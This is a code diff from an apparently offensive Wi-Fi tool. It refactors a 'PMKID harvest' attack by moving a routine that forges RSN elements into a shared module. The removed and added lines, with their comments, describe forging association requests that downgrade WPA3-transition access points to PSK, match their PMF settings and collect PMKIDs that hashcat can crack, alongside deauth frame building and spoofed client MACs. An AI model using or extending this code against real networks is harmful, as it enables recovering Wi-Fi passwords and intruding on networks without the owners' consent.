@@ -33,6 +33,7 @@ from typing import Optional
 
 from wifit3.models import AccessPoint
 from wifit3.dot11 import build_deauth
+from wifit3.dot11.ie import force_psk_akm, GENERIC_RSN_IE
 
 from .campaign import Campaign
 from .auth_assoc import Association
@@ -53,10 +54,6 @@ def _mac_bytes_to_str(b: bytes) -> str:
     return ":".join(f"{x:02x}" for x in b)
 
 
-# Generic WPA2-PSK-CCMP RSN IE used when the AP's own IE is unavailable.
-# Group=CCMP, Pairwise=CCMP, AKM=PSK, no caps.
-_GENERIC_RSN_IE = bytes.fromhex("30140100000fac040100000fac040100000fac020000")
-
 # 00-0F-AC:2 (PSK). Our forged Assoc negotiates PSK, so any PMKID the AP returns
 # is PSK-derived (crackable) — we assert it so the AKM crackability gate doesn't
 # suppress a harvest on a WPA3-transition AP whose beacon also advertises SAE.
@@ -66,46 +63,6 @@ _AKM_PSK = 0x02
 # one with a hashcat mode (WPA*01) today; PSK-variants / others are crackable in
 # principle but lack out-of-the-box tooling — add them here when that lands.
 _HARVESTABLE_AKMS = (_AKM_PSK,)
-
-# RSN caps MFPC bit (bit 7). Set (MFPR clear) for PMF-capable targets — a transition
-# AP often only associates PMF-capable STAs.
-_RSN_CAP_MFPC = 0x0080
-# Group Management Cipher advertised with MFPC: BIP-CMAC-128 (00-0F-AC:6).
-_BIP_CMAC_128 = b"\x00\x0f\xac\x06"
-
-
-def _force_psk_akm(rsn_ie: bytes, akm: int = _AKM_PSK, *, pmf_capable: bool = False) -> Optional[bytes]:
-    """Rewrite an RSN IE to a single ``00-0F-AC:akm`` AKM (PSK by default) over the
-    AP's ciphers, authoring a client RSN tail that mirrors the AP's PMF posture:
-    ``pmf_capable`` → MFPC=1 (MFPR=0) + BIP group-mgmt (a transition AP often only
-    associates PMF-capable STAs); else clean 0x0000 caps. Drops the AP's PMKID list
-    either way; returns None if the IE is malformed (caller falls back to generic).
-
-    Selecting one PSK AKM (not echoing the AP's full list, which claims SAE and gets
-    us ignored) runs the PSK 4-way → PMKID in M1. RSNE body layout: version(2)
-    group(4) pw_count(2) pw(4*n) akm_count(2) akm(4*m) [caps(2)] [pmkid_count(2)
-    pmkid...] [group-mgmt(4)]."""
-    if len(rsn_ie) < 2 or rsn_ie[0] != 0x30:
-        return None
-    body = rsn_ie[2:2 + rsn_ie[1]]
-    if len(body) < 8:
-        return None
-    pw_count = int.from_bytes(body[6:8], "little")
-    akm_off = 8 + 4 * pw_count
-    if akm_off + 2 > len(body):
-        return None
-    akm_count = int.from_bytes(body[akm_off:akm_off + 2], "little")
-    akm_end = akm_off + 2 + 4 * akm_count
-    if akm_end > len(body):
-        return None
-    new_akm = b"\x01\x00\x00\x0f\xac" + bytes([akm])      # count=1 + 00-0F-AC:akm
-    if pmf_capable:                                       # MFPC=1, PMKID-count 0, BIP
-        tail = _RSN_CAP_MFPC.to_bytes(2, "little") + b"\x00\x00" + _BIP_CMAC_128
-    else:
-        tail = b"\x00\x00"                               # clean caps, no MFP
-    new_body = body[:akm_off] + new_akm + tail
-    return bytes([0x30, len(new_body)]) + new_body
-
 
 def _str_to_mac(mac: str) -> bytes:
     return bytes(int(x, 16) for x in mac.split(":"))
@@ -184,7 +141,7 @@ class PmkidHarvestAttack(Campaign):
         # True once any attempt armed active-monitor → teardown() clears it.
         self._armed = False
         # The Assoc RSN IE (single AKM=PSK), rebuilt from the AP's ciphers in _loop.
-        self._assoc_rsn_ie: bytes = _GENERIC_RSN_IE
+        self._assoc_rsn_ie: bytes = GENERIC_RSN_IE
         # Register with the interface so client/handshake registration
         # ignores these MACs (they're not real clients).
         self.iface.register_forged_mac(self.source_mac)
@@ -259,11 +216,11 @@ class PmkidHarvestAttack(Campaign):
             logger.info("[PMKID] %s offers no PSK AKM (akm_suites=%s) — can't harvest.",
                         self.target.bssid, self.target.akm_suites)
             return
-        # The generic is a valid RSN IE, so route it through _force_psk_akm too when
+        # The generic is a valid RSN IE, so route it through force_psk_akm too when
         # we never captured the AP's own — the PMF posture still applies.
-        base_rsn = self.target.rsn_ie or _GENERIC_RSN_IE
+        base_rsn = self.target.rsn_ie or GENERIC_RSN_IE
         self._assoc_rsn_ie = (
-            _force_psk_akm(base_rsn, akm, pmf_capable=self.target.pmf_capable) or _GENERIC_RSN_IE
+            force_psk_akm(base_rsn, akm, pmf_capable=self.target.pmf_capable) or GENERIC_RSN_IE
         )
         logger.info("[PMKID] forged Assoc RSN IE (AKM→PSK 0x%02x, mfp_capable=%s): %s",
                     akm, self.target.pmf_capable, self._assoc_rsn_ie.hex())
